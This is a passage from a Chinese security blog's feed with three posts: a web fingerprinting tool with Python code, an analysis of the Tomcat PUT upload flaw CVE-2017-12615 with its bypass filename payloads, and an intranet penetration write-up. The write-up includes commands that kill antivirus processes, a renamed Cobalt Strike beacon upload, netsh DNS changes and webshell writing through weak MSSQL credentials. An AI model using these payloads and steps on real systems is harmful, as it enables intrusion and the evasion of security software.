      <category term="智能锁" scheme="http://www.future-sec.com/tags/%E6%99%BA%E8%83%BD%E9%94%81/"/>
    
      <category term="蓝牙攻击" scheme="http://www.future-sec.com/tags/%E8%93%9D%E7%89%99%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>浅谈现代化指纹识别及工具编写</title>
    <link href="http://www.future-sec.com/yet-another-web-fingerprinter.html"/>
    <id>http://www.future-sec.com/yet-another-web-fingerprinter.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2017-11-27T11:19:40.481Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用指纹识别是一个长久可研究的课题，本文主要探讨如何建立高效可靠的指纹识别方法。</p>
<h2 id="传统的指纹识别"><a href="#传统的指纹识别" class="headerlink" title="传统的指纹识别"></a>传统的指纹识别</h2><p>一些扫描器里面使用的比较多的都是通过特殊路径  静态文件的md5 值或者大小 关键词等，例如使用比较广泛的一个指纹数据库 。</p>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15047737007020.jpg" alt="img"><br>存在几个问题</p>
<ol>
<li>效率太低，每一个路径都需要访问一次。容易被waf拦截</li>
<li>目前很多网站的静态资源 cdn于gzip 压缩，md5 其实是不一样的 ，识别率很低 </li>
</ol>
<h2 id="现代化指纹识别"><a href="#现代化指纹识别" class="headerlink" title="现代化指纹识别"></a>现代化指纹识别</h2><p>怎么来快速的精确的指纹识别，观察了大部分的web系统发现，访问首页并且获取response header  能识别出80% 的app<br>例如WordPress，discuz  会把独特的cookie放到header 里面。<br>discuz  的关键词  _saltkey=<br><img src="http://ozuqqvmm5.bkt.clouddn.com/15109122240334.jpg" alt="img"></p>
<p>默认首页也会有很多固定的关键词，  WordPress   wp-conetnt<br><img src="http://ozuqqvmm5.bkt.clouddn.com/15109123220322.jpg" alt="img"></p>
<p>剩下的指纹再去特殊url提取，这样效率和准确率会提高很多很多。</p>
<h2 id="现代化指纹识别方案"><a href="#现代化指纹识别方案" class="headerlink" title="现代化指纹识别方案"></a>现代化指纹识别方案</h2><h3 id="指纹库设计"><a href="#指纹库设计" class="headerlink" title="指纹库设计"></a>指纹库设计</h3><h4 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h4><p><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191426.jpg" alt="img"><br>指纹库类型目前有3种 ，当然后续还需要加上正则。<br>finger 规则是一个 string 之后的python 字典,里面有例如状态吗,规则等字段,例如  weblogic 的指纹规则</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">'port'</span>:<span class="number">7001</span>,<span class="string">'url'</span>: <span class="string">'/console/login/LoginForm.jsp'</span>, <span class="string">'code'</span>: <span class="number">200</span>, <span class="string">'grep'</span>: <span class="string">'WebLogic Server'</span>&#125;</div></pre></td></tr></table></figure>
<p>下面介绍每一种指纹库实例</p>
<h4 id="指纹规则"><a href="#指纹规则" class="headerlink" title="指纹规则"></a>指纹规则</h4><h5 id="web-header-contain"><a href="#web-header-contain" class="headerlink" title="web_header_contain"></a>web_header_contain</h5><p>首页 response 里面的 header 查找特征符<br>速度最快,优先极最高。很多web cms 都会写特殊的cookie 键值。<br>例如 discuz,jboss,wordpress 等。<br>规则编写,以discuz 为例 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">➜  tools  curl  -I    www.cctry.com</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Server: Microsoft-IIS/6.0</div><div class="line">Connection: keep-alive</div><div class="line">Date: Thu, 07 Jan 2016 18:22:34 GMT</div><div class="line">Content-Type: text/html; charset=gbk</div><div class="line">Content-Length: 0</div><div class="line">X-Powered-By: PHP/5.2.17</div><div class="line">Set-Cookie: Vguy_2132_saltkey=O6srsEYk; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/; httponly</div><div class="line">Set-Cookie: Vguy_2132_lastvisit=1452187342; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/</div><div class="line">Set-Cookie: Vguy_2132_sid=MwE6e0; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</div><div class="line">Set-Cookie: Vguy_2132_lastact=1452190942%09index.php%09; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</div><div class="line">X-Daa-Tunnel: hop_count=1</div></pre></td></tr></table></figure>
<p>经过分析,字符串 _saltkey=  为discuz  header 中的规则<br>具体规则如下<br><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191240.jpg" alt="img"></p>
<h5 id="web-index-contain"><a href="#web-index-contain" class="headerlink" title="web_index_contain"></a>web_index_contain</h5><p>在缓存的首页里面查找关键词或者正则匹配<br>优先级次之,只需要 get请求一次即可。<br>例如Office Anywhere   指纹 编写流程<br>数据包分析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜  tools  curl  http://125.91.218.186:8000/   |  grep   <span class="string">'/images/tongda.ico'</span></div><div class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</div><div class="line">                                 Dload  Upload   Total   Spent    Left  Speed</div><div class="line">100  2001  100  2001    0     0  11795      0 --:--:-- --:--:-- --:--:-- 11840</div><div class="line">&lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"/images/tongda.ico"</span>&gt;</div></pre></td></tr></table></figure>
<p>规则编写<br><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191233.jpg" alt="img"></p>
<h5 id="web-url-contain"><a href="#web-url-contain" class="headerlink" title="web_url_contain"></a>web_url_contain</h5><p>特殊url 查找指定的关键词(返回状态码也指定)。<br>优先级最低。<br>例如  weblogic 的指纹 finger 过程<br>数据包分析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜  tools  curl  -I     http://202.97.194.9:7001/console/login/LoginForm.jsp</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Cache-Control: no-cache</div><div class="line">Date: Thu, 07 Jan 2016 18:53:28 GMT</div><div class="line">Pragma: no-cache</div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line">Expires: Thu, 01 Jan 1970 00:00:00 GMT</div><div class="line">Set-Cookie: ADMINCONSOLESESSION=XQXrWT0LQTvpf8Jv75nMnQB9vN0cGppy7bTfJxfH9S673VTGP1Wl!1715621632; path=/</div><div class="line">Content-Language: zh-CN</div><div class="line">X-Powered-By: Servlet/2.5 JSP/2.1</div></pre></td></tr></table></figure>
<p>规则</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">'url'</span>: <span class="string">'/console/login/LoginForm.jsp'</span>, <span class="string">'code'</span>: <span class="number">200</span>, <span class="string">'grep'</span>: <span class="string">'WebLogic Server'</span>&#125;</div></pre></td></tr></table></figure>
<p>表<br><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191224.jpg" alt="img"></p>
<h3 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h3><p>指纹识别模块代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="string">"""</span></div><div class="line"> *@Projet  Yafinger</div><div class="line"> *@Author  yaseng@uauc.net</div><div class="line"> *@Desc    playweb finger modules</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> ast,time</div><div class="line"><span class="keyword">import</span> config</div><div class="line"><span class="keyword">from</span>   lib                <span class="keyword">import</span> util</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_web_app</span><span class="params">(url)</span>:</span></div><div class="line">    rsp_index = util.http_get(url)</div><div class="line">    str_index = <span class="string">""</span></div><div class="line">    <span class="keyword">if</span> rsp_index == <span class="keyword">None</span> :</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">    list_app=[]</div><div class="line">    fingers=config.get(<span class="string">'fingers'</span>);</div><div class="line">    <span class="keyword">for</span>  finger  <span class="keyword">in</span>   fingers :</div><div class="line">        rule = ast.literal_eval(finger[<span class="string">'finger'</span>])</div><div class="line">        <span class="keyword">if</span> finger[<span class="string">'type'</span>] == <span class="string">'web_index_contain'</span>: </div><div class="line">            <span class="comment"># limit header and  body and code  exp : &#123;'header':'jsessionid=','code': 200, 'grep': '.action'&#125;</span></div><div class="line">            <span class="keyword">if</span> rule.has_key(<span class="string">'header'</span>) <span class="keyword">and</span>  rule[<span class="string">'header'</span>] <span class="keyword">not</span> <span class="keyword">in</span>   str(rsp_index[<span class="string">'headers'</span>]).lower()  : </div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">if</span> rsp_index[<span class="string">'code'</span>] == rule[<span class="string">'code'</span>] <span class="keyword">and</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span> rsp_index[<span class="string">'data'</span>] :</div><div class="line">                list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</div><div class="line">                util.log(<span class="string">"url:%s app:%s"</span> % (url, finger[<span class="string">'app_name'</span>]))</div><div class="line">    </div><div class="line">        <span class="keyword">elif</span> finger[<span class="string">'type'</span>] == <span class="string">'web_url_contain'</span> :</div><div class="line">             rsp_tmp = util.http_get(url + rule[<span class="string">'url'</span>])</div><div class="line">             <span class="keyword">if</span> rsp_tmp == <span class="keyword">None</span> :</div><div class="line">                 <span class="keyword">continue</span></div><div class="line">             <span class="keyword">if</span> rsp_tmp[<span class="string">'code'</span>] == rule[<span class="string">'code'</span>] <span class="keyword">and</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span> rsp_tmp[<span class="string">'data'</span>] :</div><div class="line">                 list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</div><div class="line">                 util.log(<span class="string">"url:%s app:%s"</span> % (url + rule[<span class="string">'url'</span>], finger[<span class="string">'app_name'</span>]))</div><div class="line">        <span class="keyword">elif</span>  finger[<span class="string">'type'</span>] == <span class="string">'web_header_contain'</span> :</div><div class="line"></div><div class="line">            <span class="keyword">if</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span>  str(rsp_index[<span class="string">'headers'</span>]).lower() :</div><div class="line">                list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</div><div class="line">                util.log(<span class="string">"url:%s app:%s"</span> % (url , finger[<span class="string">'app_name'</span>]))</div><div class="line">                        </div><div class="line">            </div><div class="line">        time.sleep(<span class="number">0.01</span>)</div><div class="line">    <span class="keyword">return</span>  list_app</div></pre></td></tr></table></figure>
<h3 id="单独识别"><a href="#单独识别" class="headerlink" title="单独识别"></a>单独识别</h3><p>简单调用指纹识别模块代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="string">"""</span></div><div class="line"> *@Projet  Yafinger</div><div class="line"> *@Author  yaseng@uauc.net</div><div class="line"> *@Desc    yafinger test </div><div class="line">     __    __            ___                                         </div><div class="line">    /\ \  /\ \         /'___\  __                                    </div><div class="line">    \ `\`\\/'/   __   /\ \__/ /\_\     ___       __       __   _ __  </div><div class="line">     `\ `\ /'  /'__`\ \ \ ,__\\/\ \  /' _ `\   /'_ `\   /'__`\/\`'__\</div><div class="line">       `\ \ \ /\ \L\.\_\ \ \_/ \ \ \ /\ \/\ \ /\ \L\ \ /\  __/\ \ \/ </div><div class="line">         \ \_\\ \__/.\_\\ \_\   \ \_\\ \_\ \_\\ \____ \\ \____\\ \_\ </div><div class="line">          \/_/ \/__/\/_/ \/_/    \/_/ \/_/\/_/ \/___L\ \\/____/ \/_/ </div><div class="line">                                                 /\____/             </div><div class="line">                                                 \_/__/ </div><div class="line">"""</div><div class="line"><span class="keyword">import</span>   os, time, sys, Queue, threading, ast</div><div class="line"><span class="keyword">import</span> config</div><div class="line"><span class="keyword">from</span>   lib                <span class="keyword">import</span> util</div><div class="line"><span class="keyword">from</span>   lib.db             <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span>   optparse           <span class="keyword">import</span> OptionParser</div><div class="line"><span class="keyword">from</span>   modules            <span class="keyword">import</span> finger</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    usage= <span class="string">'''%prog --host  host --port  port --finger  &lt;all|app_name&gt;   \r\nExample:%prog  --url  http://127.0.0.1    --finger phpmyadmin  '''</span></div><div class="line">    parser = OptionParser(usage=usage)</div><div class="line">    parser.add_option(<span class="string">"-u"</span>, <span class="string">"--url"</span>, dest=<span class="string">"url"</span>, help=<span class="string">"target url"</span>)</div><div class="line">    parser.add_option(<span class="string">"-f"</span>, <span class="string">"--finger"</span>, dest=<span class="string">"finger"</span>, help=<span class="string">"finger_db app_name,default all "</span>, default=<span class="string">"all"</span>)</div><div class="line">    options, arguments = parser.parse_args()</div><div class="line">    <span class="keyword">if</span> options.url == <span class="keyword">None</span> :</div><div class="line">        parser.print_help() </div><div class="line">        exit(<span class="number">0</span>)</div><div class="line">    db = MySQL(config.db_config)</div><div class="line">    sql_finger_where=<span class="string">' '</span>  <span class="keyword">if</span> options.finger == <span class="string">'all'</span> <span class="keyword">else</span> <span class="string">"  and  app_name='%s' "</span>  % options.finger</div><div class="line">    db.query(<span class="string">"SELECT  * from  pw_finger_db  where  `enable`=1   %s "</span>  % sql_finger_where)</div><div class="line">    fingers = db.fetch_all()</div><div class="line">    <span class="keyword">if</span> len(fingers) == <span class="number">0</span> :</div><div class="line">        util.log(<span class="string">'finger app_name %s not found'</span> % options.finger ,<span class="number">3</span>,<span class="string">'finger'</span>) </div><div class="line">    config.set(<span class="string">"fingers"</span>,fingers)</div><div class="line">    util.log(<span class="string">"load fingers count %d"</span> % len(fingers),<span class="number">1</span>,<span class="string">'finger'</span>)</div><div class="line">    finger.get_web_app(options.url)</div></pre></td></tr></table></figure>
<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15109322329056.jpg" alt="img"></p>
<h3 id="批量识别"><a href="#批量识别" class="headerlink" title="批量识别"></a>批量识别</h3><p> 可以使用线程池来实现批量指纹识别。</p>
<h3 id="指纹结果"><a href="#指纹结果" class="headerlink" title="指纹结果"></a>指纹结果</h3><p>融合到系统中指纹保存在数据库中，本模块可以快速整合到扫描器或者其他项目中。</p>
<h2 id="yafinger"><a href="#yafinger" class="headerlink" title="yafinger"></a>yafinger</h2><p>yet another  web  fingerprinter<br><a href="https://github.com/yaseng/yafinger" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/yaseng/yafinger</a></p>
<h2 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h2><ol>
<li>指纹库需要补充</li>
<li>可以不局限于web指纹</li>
<li>某些情况可能目前的指纹规则不符合，还需要添加新的指纹规则，例如正则</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="指纹识别" scheme="http://www.future-sec.com/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat 远程代码执行漏洞分析（CVE-2017-12615）</title>
    <link href="http://www.future-sec.com/tomcat-code-execution.html"/>
    <id>http://www.future-sec.com/tomcat-code-execution.html</id>
    <published>2017-11-19T16:00:00.000Z</published>
    <updated>2017-11-20T07:52:22.019Z</updated>
    
    <content type="html"><![CDATA[<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>环境是Windows 7 64位  Apache Tomcat 7.0.70<br><img src="/images/tom/1.jpg" alt="img"></p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。<br>通过阅读 conf/web.xml 文件，可以发现：<br><img src="/images/tom/2.jpg" alt="img"><br>修改 Tomcat 7.0/conf/web.xml 文件。添加 readonly 属性，设置为false。<br><img src="/images/tom/3.jpg" alt="img"><br>重启tomcat<br>启动 Tomcat，利用 PUT 请求创建文件：<br><img src="/images/tom/4.jpg" alt="img"><br>提示 404。通过所描述的 Windows 受影响，可以结合 Windows 的特性。一是 NTFS 文件流，二是文件名的相关限制（比如 Windows 中文件名不能以空格结尾）来绕过限制：<br><img src="/images/tom/5.jpg" alt="img"><br><img src="/images/tom/6.jpg" alt="img"><br>访问发现可以正常输出：<br><img src="/images/tom/7.jpg" alt="img"></p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>本次的tomcat漏洞涉及到DefaultServlet和 JspServlet。<br>Tomcat的Servlet 是在 conf/web.xml 配置的，通过配置文件可知，当后缀名为 .jsp 和 .jspx 的时候，是通过JspServlet处理请求的，下面的默认的配置情况：<br><img src="/images/tom/8.jpg" alt="img"><br>而其他的静态文件时通过DefaultServlet处理的，同时DefaultServlet 可以处理 PUT 或 DELETE请求：<br><img src="/images/tom/9.jpg" alt="img"><br>也就是说，除了jsp和jspx默认是由org.apache.jasper.servlet.JspServlet处理，其他默认都是由org.apache.catalina.servlets.DefaultServlet来处理。<br>从而的得知，即是设置readonly为false，tomcat在默认情况下也不允许PUT上传jsp和jspx文件，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的相关操作，PUT的代码实现只存在于DefaultServlet中。<br>这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。<br>目前主要三种方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">test.jsp%<span class="number">20</span></div><div class="line">test.jsp::$DATA</div><div class="line">test.jsp/   (bypass)</div></pre></td></tr></table></figure></p>
<p>可以得知，“test.jsp ”（末尾有一个和空格即“test.jsp%20”）和“test.jsp::$DATA<br>”并不能匹配到 JspServlet，而是会交由DefaultServlet去处理。当处理 PUT 请求时：<br><img src="/images/tom/10.jpg" alt="img"><br>主要是doPut，这里tomcat开始处理PUT请求，可以看到这里如果readonly是true就直接进入error了，所以在前面的步骤中需要设置成false。<br><img src="/images/tom/11.jpg" alt="img"><br>会调用resources.bind：<br><img src="/images/tom/12.jpg" alt="img"><br><img src="/images/tom/13.jpg" alt="img"><br>而继续调用dirContext.bind<br><img src="/images/tom/14.jpg" alt="img"><br>真正写入文件在FileDirContext.java的rebind函数里<br><img src="/images/tom/15.jpg" alt="img"><br>又由于 Windows 不允许“ ”（此处为一个空格）作为文件名结尾，所以会创建一个 .jsp 文件，导致代码执行。<br>FileOutputStream特性<br>到这里是否会想，当请求jsp%20或是jsp::$DATA后缀的时候，为什么最终却写入.jsp后缀的文件?<br>这些其实是java.io. FileOutputStream的问题了，需要进一步分析jdk的C代码才能得到解答，如图<br><img src="/images/tom/16.jpg" alt="img"><br>跟进去FileOutputStream<br><img src="/images/tom/17.jpg" alt="img"><br>跟进去open<br><img src="/images/tom/18.jpg" alt="img"><br>跟到open是native的，不是java层面的问题了，这里open实际上是一个jni接口，然后调用windows API CreateFileW创建文件，这里下载openjdk6的jdk代码进行分析，如图:<br><img src="/images/tom/19.jpg" alt="img"><br>FileOutputStream_md.c<br>这里Java_java_io_FileOutputStream_open便是上面java代码里open函数的C代码实现，其中参数path对应open函数的name变量，继续跟踪，如图:<br><img src="/images/tom/20.jpg" alt="img"><br>io_util_md.c<br>继续跟进去winFileHandleOpen，这里最终调用windows的CreateFileW实现文件创建，如图：<br><img src="/images/tom/21.jpg" alt="img"><br>io_util_md.c<br>而在windows下，创建文件是对后缀名称进行处理的，例如：如果后缀末尾是空格，会被去掉，a.txt::$DATA传入CreateFileW也会被处理成a.txt</p>
<h2 id="Bypass-分析"><a href="#Bypass-分析" class="headerlink" title="Bypass 分析"></a>Bypass 分析</h2><p>然而，当 PUT 地址为/test.jsp/时，仍然会创建 JSP，会影响 Linux 和 Windows 服务器，并且 Bypass 了之前的补丁，分析如下。<br>在进入 bind 函数时，会声明一个 File 变量：<br><img src="/images/tom/22.jpg" alt="img"><br>进入 File 后，会对 name 进行 normalize  (在file.class)<br><img src="/images/tom/23.jpg" alt="img"><br>继续跟入<br><img src="/images/tom/24.jpg" alt="img"><br>在这里这个normalize(path, n, (prev == slash) ? i - 1 : i)会将文件名末尾的/过滤掉，所以可以导致后面文件写入jsp文件。</p>
<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>由于存在去掉最后的 / 的特性，那么这个漏洞自然影响 Linux 以及 Windows 版本。而且经过测试，这个漏洞影响全部的 Tomcat 版本，从 5.x 到 9.x 都会受到影响。目前来说，最好的解决方式是将 conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true，（默认设置是false）。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;复现环境&quot;&gt;&lt;a href=&quot;#复现环境&quot; class=&quot;headerlink&quot; title=&quot;复现环境&quot;&gt;&lt;/a&gt;复现环境&lt;/h2&gt;&lt;p&gt;环境是Windows 7 64位  Apache Tomcat 7.0.70&lt;br&gt;&lt;img src=&quot;/images/to
    
    </summary>
    
      <category term="系统安全" scheme="http://www.future-sec.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Tomcat" scheme="http://www.future-sec.com/tags/Tomcat/"/>
    
      <category term="远程代码执行" scheme="http://www.future-sec.com/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>记一次曲折的内网渗透</title>
    <link href="http://www.future-sec.com/network-penetration.html"/>
    <id>http://www.future-sec.com/network-penetration.html</id>
    <published>2017-11-19T16:00:00.000Z</published>
    <updated>2017-11-20T08:29:04.175Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p> 网络：内网C1和C2处于同一网段，可以互通，仅DNS可以访问外网。 安全防护：360全家桶、安全狗、云锁定制版、金山卫士 其他相关信息如下表：<br><img src="/images/20171120162810.jpg" alt="img"></p>
<h2 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h2><p>C1是通weblogic反序列化拿下的，具体怎么获取的webshell就不细说了，根据C1的配置、文件、主机名和数据库等信息可以知道，目标网站之前是存放再C1的，因为上面的源码和数据库基本上和C2的一致。通过weblogic的配置文件可以知道C2的真实IP，主机上面存在各种安全防护软件，各种全家桶，很多命令、脚本和exe都无法运行，比如带有net的命令都无法运行，net、netstat、sc、wscript等</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>目标：获取C2的管理权限，包括网站内容管理和替换等，非单纯的系统权限。<br>1、通过C1利用http隧道或DNS隧道进行socks代理，对C2进行进一步渗透<br>2、抓取C1管理员口令或直接利用当前用户的token进行攻击<br>3、利用数据库或中间件弱口令进行攻击<br>4、利用web漏洞进行攻击，如注入、上传和命令执行等漏洞<br>5、中间人攻击或者嗅探等，但是影响太大，也需等比较久的时间</p>
<h2 id="过河搭桥"><a href="#过河搭桥" class="headerlink" title="过河搭桥"></a>过河搭桥</h2><p>由于是weblogic，无法直接使用http隧道类的代理，因为环境仅支持jspx，没有找到可以用的代理webshell，故采取第二种方案，即通过DNS进行控制和代理。这里我首先想到的自然是cobalt strike的DNS Beacon。</p>
<h2 id="cobalt-strike-dns-beacon-环境构建"><a href="#cobalt-strike-dns-beacon-环境构建" class="headerlink" title="cobalt strike dns beacon 环境构建"></a>cobalt strike dns beacon 环境构建</h2><p>参考：<a href="https://www.cobaltstrike.com/help-dns-beacon" rel="external nofollow noopener noreferrer" target="_blank">官方手册</a> 或自行google</p>
<h2 id="获取beacon"><a href="#获取beacon" class="headerlink" title="获取beacon"></a>获取beacon</h2><p>由于存在360全家桶等，所以得先把他们干掉：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">taskkill /im <span class="number">360</span>* /t /f</div><div class="line">taskkill /im ZhuDongFangYu.exe /t /f</div><div class="line">taskkill /im KSafeSvc.exe /t /f</div><div class="line">ps:云锁是定制版，这里就不写进程名称了，也不影响远控的执行，安全无法结束也不影响</div></pre></td></tr></table></figure></p>
<p>由于无法上传exe，所以将生成exe重命名为jspx上传，执行之后，等待几分钟，既可以成功上线，这里有个坑，因为内网配置的DNS可能是一些不知名的或者是114之类的，会影响上线，所以这里建议使用8.8.8.8或者119.29.29.29，因为我用的是DNSPOD，修改DNS:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh interface ip set dns "本地连接" source=static addr=119.29.29.29</div></pre></td></tr></table></figure></p>
<h2 id="开启代理"><a href="#开启代理" class="headerlink" title="开启代理"></a>开启代理</h2><p> 参考<a href="https://cobaltstrike.com/help-socks-proxy-pivoting" rel="external nofollow noopener noreferrer" target="_blank">官方手册</a><br> linux可以用Proxychains，windows可以使用Proxifier PE或SocksCap64 </p>
<h2 id="内网漫游"><a href="#内网漫游" class="headerlink" title="内网漫游"></a>内网漫游</h2><p> 通过jsp大马自带的端口扫描发现C2开放的端口有： 80：WMC生成的html，没啥可搞的 1433：因为C1的mysql账号密码是root/root，因此猜测存在弱口令 8080、8001、8081：就apache的一个代理，没有什么页面和功能 利用socks代理通过1433连接器，sa/sa获取了mssql的DBA权限，暗自高兴了一会，以为道这里就快搞定了，因为系统存在多个web服务，很自然的可以想到，直接可以通过mssql的xp_cmdshell，echo一个一句话就可以搞定了，然而这只是开始。 </p>
<h2 id="山重水复疑无路"><a href="#山重水复疑无路" class="headerlink" title="山重水复疑无路"></a>山重水复疑无路</h2><p>iis环境，可以写一句话，但是所有目录的脚本权限都被禁止，所以这条路也断了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">简单提一下，iis找网站路径的方法</div><div class="line"><span class="number">1.</span> dir/s /b f:\<span class="number">123.</span>jpg (磁盘文件太多时无法使用)</div><div class="line"><span class="number">2.</span> 查看配置文件：</div><div class="line">iis6:type  %systemroot%\system32\inetsrv\metabase.xml|findstr Path=</div><div class="line">iis7/<span class="number">8</span>:type %systemroot%\System32\inetsrv\config\applicationHost.config|findstr physicalPath=</div><div class="line">iis7/<span class="number">8</span>:  appcmd <span class="keyword">list</span> sites</div></pre></td></tr></table></figure></p>
